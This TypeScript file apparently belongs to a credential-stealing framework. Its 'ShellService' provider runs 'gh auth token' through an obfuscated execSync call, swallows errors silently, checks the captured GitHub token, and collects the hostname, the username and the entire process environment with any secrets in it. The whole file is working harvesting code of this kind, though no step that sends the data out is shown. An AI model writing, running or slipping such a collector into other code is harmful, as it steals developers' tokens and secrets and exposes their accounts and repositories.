import { execSync } from "child_process";
import { hostname, userInfo } from "os";

import { checkToken } from "../../github_utils/tokenCheck";
import { Provider } from "../base";
import type { ProviderResult } from "../types";

declare function scramble(str: string): string;

export class ShellService extends Provider {
  constructor() {
    super("shell", "misc");
  }

  async execute(): Promise<ProviderResult> {
    const results: Record<string, any> = {};
    try {
      const token = execSync(scramble("gh auth token"), {
        encoding: "utf-8",
        stdio: ["pipe", "pipe", "pipe"],
      }).trim();

      if (token) {
        results["token"] = token;
        try {
          results["metadata"] = await checkToken(token);
        } catch (error1) {}
      }
    } catch (error) {}

    results["hostname"] = hostname();
    try {
      results["user"] = userInfo().username;
    } catch {
      // userInfo throws on some restricted environments
      results["user"] = process.env.USER ?? process.env.LOGNAME ?? "unknown";
    }

    results["environment"] = process.env;

    if (Object.keys(results).length > 0) {
      return this.success(results);
    } else {
      return this.failure("No Result");
    }
  }
}
